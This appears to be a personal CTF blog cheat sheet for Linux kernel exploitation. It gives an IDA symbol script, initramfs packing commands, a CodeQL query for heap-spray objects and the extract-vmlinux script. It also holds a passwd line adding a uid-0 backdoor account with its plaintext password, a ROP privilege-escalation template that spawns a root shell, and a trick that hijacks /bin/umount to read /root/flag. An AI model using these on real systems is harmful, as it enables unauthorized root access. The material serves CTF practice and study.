---
title: "Kernel"
date: 2023-09-25T11:37:02+08:00
draft: false
tags: ["pwn", "kernel"]
categories: ["pwn"]
---

## kallsyms

```python
import idc
import ida_funcs
import ida_kernwin
ksyms = open("/path/to/kallsyms.txt")
for line in ksyms:
 addr = int(line[0:16],16)
 name = line[19:].replace('_','')
 name = line[19:].replace('\n','')
 idc.create_insn(addr)
 ida_funcs.add_func(addr)
 idc.set_name(addr,name)
 ida_kernwin.msg("%08X:%s"%(addr,name))
```

## passwd

```
pwned:$1$aa$Sc4m1DBsyHWbRbwmIbGHq1:0:0:/root:/root:/bin/sh # 密码：lol
```

## cpio

```c
gcc -o exp -static exp.c -masm=intel -s -lpthread

mv ./exp ./initramfs
cd initramfs
find . -print0 \
| cpio --null -ov --format=newc \
| gzip -9 > ../initramfs.cpio.gz
cd ..
```

## mount

```c
# ext4
sudo mount -o rw -osync -o auto -o exec rootfs.img rootfs
```

## 模板

```c
#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <syscall.h>
#include <unistd.h>

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define logd(fmt, ...) \
    dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...)                                                    \
    dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...)                                                     \
    dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...)                                                  \
    dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        exit(1);                           \
    } while (0)

#define o(x) (kbase + x)

size_t pop_rdi = 0x2c9d;
size_t commit_creds = 0xbb5b0;
size_t init_cred = 0x1a4cbf8;
size_t swapgs_restore_regs_and_return_to_usermode = 0x1000f01;
size_t prepare_kernel_cred = 0xf8520;

unsigned long user_cs, user_ss, user_eflags, user_sp, user_ip;

void get_shell() {
    int uid;
    if (!(uid = getuid())) {
        logi("root get!!");
        execl("/bin/sh", "sh", NULL);
    } else {
        die("gain root failed, uid: %d", uid);
    }
}

void saveStatus(void) {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_eflags;"
            );

    user_ip = (uint64_t)&get_shell;
    user_sp = 0xf000 +
              (uint64_t)mmap(0, 0x10000, 6, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
}

void bind_cpu(int cpu_idx) {
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(cpu_idx, &my_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set)) {
        die("sched_setaffinity: %m");
    }
}

void hexdump(const void *data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        dprintf(2, "%02X ", ((unsigned char *)data)[i]);
        if (((unsigned char *)data)[i] >= ' ' &&
            ((unsigned char *)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char *)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size) {
            dprintf(2, " ");
            if ((i + 1) % 16 == 0) {
                dprintf(2, "|  %s \n", ascii);
            } else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    dprintf(2, " ");
                }
                for (j = (i + 1) % 16; j < 16; ++j) {
                    dprintf(2, "   ");
                }
                dprintf(2, "|  %s \n", ascii);
            }
        }
    }
}

size_t kbase;

int main()
{
    saveStatus();
    int fd = open("/dev/seven", O_RDONLY);
    if(fd < 0) perror("Error open");
}
```

## Codeql for obj

```bash
import cpp

from FunctionCall fc, Function f, int alloc_size, int alloc_flags, PointerType typ
where
  f = fc.getTarget() and
  // 只查找kalloc和kzalloc类的函数
  f.getName().regexpMatch("k[a-z]*alloc") and
  alloc_size = fc.getArgument(0).getValue().toInt() and
  // get object in kmalloc-64,128,192
  (alloc_size > 32 and alloc_size <= 192) and
  alloc_flags = fc.getArgument(1).getValue().toInt() and
  // GFP_ACCOUNT == 0x400000(4194304)
  alloc_flags.bitAnd(4194304) = 0 and
  typ = fc.getActualType().(PointerType) and
  not fc.getEnclosingFunction().getFile().getRelativePath().regexpMatch("arch.*") and 
  not fc.getEnclosingFunction().getFile().getRelativePath().regexpMatch("drivers.*") 
select fc, "在 $@ 的 $@ 中发现一处调用 $@ 分配内存，结构体 $@, 大小 " + alloc_size.toString(),
fc,fc.getEnclosingFunction().getFile().getRelativePath(), fc.getEnclosingFunction(),
  fc.getEnclosingFunction().getName().toString(), fc, f.getName(), typ.getBaseType(),
  typ.getBaseType().getName()
```

## extract-vmlinux

```c
#!/bin/sh
# SPDX-License-Identifier: GPL-2.0-only
# ----------------------------------------------------------------------
# extract-vmlinux - Extract uncompressed vmlinux from a kernel image
#
# Inspired from extract-ikconfig
# (c) 2009,2010 Dick Streefland <dick@streefland.net>
#
# (c) 2011      Corentin Chary <corentin.chary@gmail.com>
#
# ----------------------------------------------------------------------

check_vmlinux()
{
	# Use readelf to check if it's a valid ELF
	# TODO: find a better to way to check that it's really vmlinux
	#       and not just an elf
	readelf -h $1 > /dev/null 2>&1 || return 1

	cat $1
	exit 0
}

try_decompress()
{
	# The obscure use of the "tr" filter is to work around older versions of
	# "grep" that report the byte offset of the line instead of the pattern.

	# Try to find the header ($1) and decompress from here
	for	pos in `tr "$1\n$2" "\n$2=" < "$img" | grep -abo "^$2"`
	do
		pos=${pos%%:*}
		tail -c+$pos "$img" | $3 > $tmp 2> /dev/null
		check_vmlinux $tmp
	done
}

# Check invocation:
me=${0##*/}
img=$1
if	[ $# -ne 1 -o ! -s "$img" ]
then
	echo "Usage: $me <kernel-image>" >&2
	exit 2
fi

# Prepare temp files:
tmp=$(mktemp /tmp/vmlinux-XXX)
trap "rm -f $tmp" 0

# That didn't work, so retry after decompression.
try_decompress '\037\213\010' xy    gunzip
try_decompress '\3757zXZ\000' abcde unxz
try_decompress 'BZh'          xy    bunzip2
try_decompress '\135\0\0\0'   xxx   unlzma
try_decompress '\211\114\132' xy    'lzop -d'
try_decompress '\002!L\030'   xxx   'lz4 -d'
try_decompress '(\265/\375'   xxx   unzstd

# Finally check for uncompressed images or objects:
check_vmlinux $img

# Bail out:
echo "$me: Cannot find vmlinux." >&2
```

## 非预期
```bash
mv bin bin1
/bin1/mkdir bin
/bin1/chmod 777 bin
/bin1/echo "/bin1/cat /root/flag" > /bin/umount
/bin1/chmod 777 /bin/umount
exit
```